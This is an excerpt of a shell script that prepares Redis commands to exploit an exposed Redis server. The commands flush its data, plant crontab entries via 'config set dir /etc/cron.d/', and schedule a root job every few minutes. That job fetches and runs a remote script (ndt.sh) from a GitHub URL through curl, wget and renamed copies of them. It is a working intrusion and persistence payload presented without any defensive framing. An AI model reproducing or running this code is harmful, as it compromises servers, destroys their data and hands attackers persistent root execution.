...
then
    ...
    echo 'flushall' >> .dat
    echo 'set backup1 "\n\n\n*/2 * * * * cd1 -fsSL https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'set backup4 "\n\n\n*/5 * * * * wd1 -q -O- https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    ...
    echo 'save' >> .dat
    echo 'flushall' >> .dat
    echo 'set backup1 "\n\n\n*/2 * * * * root cd1 -fsSL https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'set backup2 "\n\n\n*/3 * * * * root wget -q -O- https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'set backup3 "\n\n\n*/4 * * * * root curl -fsSL https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'set backup4 "\n\n\n*/5 * * * * root wd1 -q -O- https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/ndt.sh | sh\n\n"' >> .dat
    echo 'config set dir "/etc/cron.d/"' >> .dat
    echo 'config set dbfilename "nginx"' >> .dat
    echo 'save' >> .dat
